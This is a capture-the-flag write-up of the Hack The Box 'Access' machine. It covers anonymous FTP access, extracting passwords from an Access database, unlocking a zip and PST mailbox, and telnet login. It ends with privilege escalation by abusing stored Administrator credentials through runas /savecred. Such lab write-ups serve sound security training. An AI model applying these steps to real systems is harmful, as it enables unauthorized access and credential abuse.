### HTB Access    10.10.10.98

Start off as always with an nmap scan.

```
(kali㉿kali)-$ sudo nmap -T4 -p- -Pn 10.10.10.98 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 17:35 EDT
Nmap scan report for 10.10.10.98
Host is up (0.044s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 93.78 seconds
```

Ok, 3 ports to work with.  Let's get to it.  Going to give FTP a try first with anonymous login and see where that gets me.

```
(kali㉿kali)-$ ftp 10.10.10.98                 
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

Well that was quick and easy.  After some poking around in there, I have access to two files from two seperate folders.  Lets go ahead and grab both of those, yea?

First thing, in ftp, switching to binary mode can assist with transfers.  First time I tried it the transfer didn't go so hot so redid it and the transfer worked fine.

Without Binary on...

```
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
 21% |*****************                                                                   |  1162 KiB    1.13 MiB/s    00:03 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                    |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 588 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
```

With Binary on...

```
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |************************************************************************************|  5520 KiB    1.27 MiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:04 (1.27 MiB/s)
```

So, working in ftp, start that off by running the `binary` command.

Now that we have those files, what's next?

![files](/Images/HTB5Access/pic1.png)

Try to extract the zip and it requires a password.  Don't have that.  So how about the .mdb file?  In order to open that, we need a program called 'mdb files' `mdb-sql`.  I had to do some looking but ended up finding `mdbtools` and it worked a treat.

After some looking at the tools readme on github, I was able to use the following commands.

`mdb-tables backup.mdb`

![mdb-tables](/Images/HTB5Access/pic2.png)

Looking through the tables I see the table `auth_user` and I wonder what's in there.  I can go through any tables that I want using the following command, but I'll show you the table we have here.

`mdb-export backup.mdb auth_user`

![auth_user](/Images/HTB5Access/pic3.png)

So a couple passwords here.  Give those a try on the zip file we tried earlier.  One doesn't work....but one does!  And we have a pst file.

![pst file](/Images/HTB5Access/pic4.png)

Now, what to do with a pst file.  I know it's an outlook file.  Try to install `readpst` and it tells me to get `pst-utils` instead.  Do that and then run the following command.

```
(kali㉿kali)-$ readpst Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

And now a new file has shown up in the folder.

![New File](/Images/HTB5Access/pic5.png)

Double click on the mbox file to see what it does and it opens a text like document with email info in it.  But what's this.  Looks like a nice little password for us, yea?

![Email Contents](/Images/HTB5Access/pic6.png)

So, now we have a new password and a new username to try.

Tried it first on the ftp, didn't work.  But we had another port, telnet was open.  Let's give that a try.

```
(kali㉿kali)-$ telnet -l security 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

Ok, got my in and low level user.  Quick checks and grab that user flag.

![User Flag](/Images/HTB5Access/pic7.png)

And then we move on to the elevation part.

```
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

Ok, so looks like we have the Administrator account creds stored on this device.  So lets utilize the `runas.exe` command to run things as admin since they were so nice as to leave the creds right there for us.

`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"`

![File copied](/Images/HTB5Access/pic8.png)

![Root Flag](/Images/HTB5Access/pic9.png)

And that's that.  This was just a simple example of what you can use `runas` for.  At this point we could run pretty much whatever we wanted as Administartor using this vulnerability.  We can do more enumeration at this point with other tools like Mimikatz or the like.  Just substitute the command and path to what you want to execute.

Another fun one in the books.  It's always so interesting to learn these different techniques.  Till next time :)